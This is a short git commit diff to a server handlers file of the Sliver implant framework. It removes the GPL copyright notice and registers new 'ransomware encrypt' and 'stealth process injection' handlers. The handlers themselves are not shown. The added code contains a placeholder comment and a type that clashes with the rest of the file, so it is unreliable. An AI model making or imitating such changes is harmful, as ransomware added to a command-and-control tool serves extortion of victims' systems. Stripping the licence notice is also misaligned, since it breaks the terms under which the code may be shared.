3df4a156c6aeb805a984156f7af2e13da2cd5a45
Jsvghr <gordonjoseva39@gmail.com>
2025-11-01 10:19:23 +0700

    Remove copyright and add ransomware handlers
    Removed copyright notice and added ransomware handlers.
    
    Signed-off-by: Jsvghr <gordonjoseva39@gmail.com>

--- server/handlers/handlers.go
+++ server/handlers/handlers.go
@@ -1,26 +1,5 @@
 package handlers
 
-/*
-	Sliver Implant Framework
-	Copyright (C) 2021  Bishop Fox
-
-	This program is free software: you can redistribute it and/or modify
-	it under the terms of the GNU General Public License as published by
-	the Free Software Foundation, either version 3 of the License, or
-	(at your option) any later version.
-
-	This program is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with this program.  If not, see <https://www.gnu.org/licenses/>.
-	------------------------------------------------------------------------
-
-	WARNING: These functions can be invoked by remote implants without user interaction
-
-*/
 
 import (
 	"sync"
@@ -34,6 +13,17 @@ type ServerHandler func(*core.ImplantConnection, []byte) *sliverpb.Envelope
 var (
 	tunnelHandlerMutex = &sync.Mutex{}
 )
+
+func GetSystemHandlers() map[uint32]Handler {
+	return map[uint32]Handler{
+		// ... existing handlers ...
+		
+		// RANSOMWARE HANDLERS - HANYA REGISTER DI SINI
+		sliverpb.MsgRansomwareEncrypt:    RansomwareEncryptHandler,
+		sliverpb.MsgProcessInjectStealth: ProcessInjectStealthHandler,
+	}
+}
+
 
 // GetHandlers - Returns a map of server-side msg handlers
 func GetHandlers() map[uint32]ServerHandler {
